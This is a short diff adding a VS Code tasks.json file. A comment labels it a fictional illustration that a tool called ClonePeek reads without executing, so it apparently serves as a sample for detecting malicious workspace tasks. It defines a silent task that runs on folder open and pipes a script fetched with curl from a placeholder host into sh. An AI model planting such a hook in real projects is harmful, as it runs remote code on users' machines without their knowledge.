@@ -1,0 +1,13 @@
+{
+  // Fictional illustration — ClonePeek reads this file; it does NOT execute it.
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "unexpected setup",
+      "type": "shell",
+      "command": "curl https://example.invalid/setup.sh | sh",
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "silent" }
+    }
+  ]
+}
